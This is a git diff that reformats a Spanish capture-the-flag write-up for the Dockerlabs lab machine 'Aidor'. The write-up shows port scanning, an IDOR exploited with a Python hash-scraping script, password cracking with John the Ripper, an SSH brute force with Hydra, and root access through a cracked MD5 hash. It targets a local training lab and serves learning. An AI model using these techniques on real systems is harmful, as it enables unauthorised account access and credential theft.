@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Aidor 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Aidor ​​
+
+## 🖥️ Writeup - Aidor
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `IDOR` `Python Scripting` `JohnTheRipper` `Hydra` `Information Leakage`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip aidor.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh aidor.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,5000 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-27 17:22 CET
 Nmap scan report for 172.17.0.2
@@ -79,18 +88,17 @@ Identificamos los puertos `22` y `5000` abiertos.
 
 Accedemos a través del puerto `5000` y encontramos un panel de inicio de sesión.
 
-![alt text](../../images/dashlogin.png)
+![alt text](../../.gitbook/assets/dashlogin.png)
 
 Vemos que en la parte inferior indica que nos podemos registrar, así que lo hacemos con un usuario de prueba.
 
-![alt text](../../images/testuser.png)
+![alt text](../../.gitbook/assets/testuser.png)
 
 Procedemos a iniciar sesión con la cuenta que acabamos de crear y accedemos al dashboard.
 
-![alt text](../../images/dashb.png)
+![alt text](../../.gitbook/assets/dashb.png)
 
-Una vez en el dashboard vemos nuestro nombre de usuario y nuestra contraseña actual (el `hash`).
-Sin embargo, nos llama mucho más la atención otra cosa, la `URL`:
+Una vez en el dashboard vemos nuestro nombre de usuario y nuestra contraseña actual (el `hash`). Sin embargo, nos llama mucho más la atención otra cosa, la `URL`:
 
 ```
 http://172.17.0.2:5000/dashboard?id=55
@@ -98,18 +106,18 @@ http://172.17.0.2:5000/dashboard?id=55
 
 Esta nos indica que nuestro usuario tiene el identificador 55. Vamos a comprobar si la página sufre de una vulnerabilidad `IDOR`, modificando manualmente el identificador de la `URL` para intentar acceder a cuentas ajenas.
 
-# EXPLOTACIÓN IDOR
+## EXPLOTACIÓN IDOR
 
-![alt text](../../images/pepe.png)
+![alt text](../../.gitbook/assets/pepe.png)
 
 Como podemos ver, al cambiar el `ID` de 55 a 53, entramos en la cuenta de `pepe` y podemos visualizar su contraseña hasheada.
 
-Probamos con los identificadores `0` y `1` buscando una cuenta de `administrador`, pero no encontramos ninguna.
-Verificamos manualmente que existen usuarios para los identificadores del 3 al 54.
+Probamos con los identificadores `0` y `1` buscando una cuenta de `administrador`, pero no encontramos ninguna. Verificamos manualmente que existen usuarios para los identificadores del 3 al 54.
 
 Lo que nos interesa sobre todo es obtener el `hash` de la contraseña de cada usuario. Para ello, y para evitar hacerlo manualmente, elaboramos un script en `Python` (con ayuda de la IA) que extrae el `hash` de cada usuario y lo almacena en un archivo `.txt`.
 
 Script:
+
 ```py
 import requests
 from bs4 import BeautifulSoup
@@ -166,6 +174,7 @@ python3 hash_extract.py
 ```
 
 Info:
+
 ```
 [*] Iniciando ataque IDOR para extraer hashes (IDs 3-54)...
 [+] ID 3: 5e884898da28047...
@@ -224,7 +233,7 @@ Info:
 [*] Proceso finalizado. Hashes guardados en 'hashes.txt'
 ```
 
-# HASH CRACKING
+## HASH CRACKING
 
 Ya tenemos todos los hashes recopilados en el archivo `hashes.txt`, por lo que intentamos crackearlos con `John The Ripper`.
 
@@ -233,6 +242,7 @@ john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 ```
 
 Info:
+
 ```
 Using default input encoding: UTF-8
 Loaded 4 password hashes with no different salts (Raw-SHA256 [SHA256 256/256 AVX2 8x])
@@ -249,10 +259,10 @@ Use the "--show --format=Raw-SHA256" options to display all of the cracked passw
 Session completed.
 ```
 
-Conseguimos obtener cuatro contraseñas, correspondientes a los usuarios con `ID` 3, 52, 53 y 54.
-Verificamos manualmente qué nombres de usuario corresponden a estos `IDs`.
+Conseguimos obtener cuatro contraseñas, correspondientes a los usuarios con `ID` 3, 52, 53 y 54. Verificamos manualmente qué nombres de usuario corresponden a estos `IDs`.
 
 Quedaría así:
+
 ```
 juan.perez : password
 pingu : pingu
@@ -291,6 +301,7 @@ hydra -L users.txt -P pass.txt ssh://172.17.0.2 -t 50
 ```
 
 Info:
+
 ```
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -309,10 +320,9 @@ Accedemos vía `SSH`.
 ssh aidor@172.17.0.2
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 En el directorio `/home` localizamos un archivo llamado `app.py`. Al leer su contenido, vemos lo siguiente:
-
 
 ```
 cursor.execute('SELECT COUNT(*) FROM users')
@@ -326,19 +336,16 @@ cursor.execute('SELECT COUNT(*) FROM users')
         conn.close()
 ```
 
-Observamos una contraseña hasheada asignada al usuario `root`.
-Aunque el comentario en el código indica que es un `hash SHA-256`, para que fuese así debería tener una longitud de 64 caracteres.
-Sin embargo, el `hash` que tenemos delante tiene 32 caracteres, por lo que deducimos que probablemente se trate de un `hash MD5`.
+Observamos una contraseña hasheada asignada al usuario `root`. Aunque el comentario en el código indica que es un `hash SHA-256`, para que fuese así debería tener una longitud de 64 caracteres. Sin embargo, el `hash` que tenemos delante tiene 32 caracteres, por lo que deducimos que probablemente se trate de un `hash MD5`.
 
-Guardamos el hash en un archivo `hash.txt` con el formato `root:aa87ddc5b4c24406d26ddad771ef44b0`.
-Utilizamos `John The Ripper` para crackearlo.
+Guardamos el hash en un archivo `hash.txt` con el formato `root:aa87ddc5b4c24406d26ddad771ef44b0`. Utilizamos `John The Ripper` para crackearlo.
 
 ```bash
 john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
-
 Info:
+
 ```
 Using default input encoding: UTF-8
 Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
@@ -350,8 +357,7 @@ Use the "--show --format=Raw-MD5" options to display all of the cracked password
 Session completed. 
 ```
 
-Obtenemos exitosamente las credenciales de `root` : `estrella`.
-Finalmente, procedemos a autenticarnos con dichas credenciales.
+Obtenemos exitosamente las credenciales de `root` : `estrella`. Finalmente, procedemos a autenticarnos con dichas credenciales.
 
 ```bash
 su root
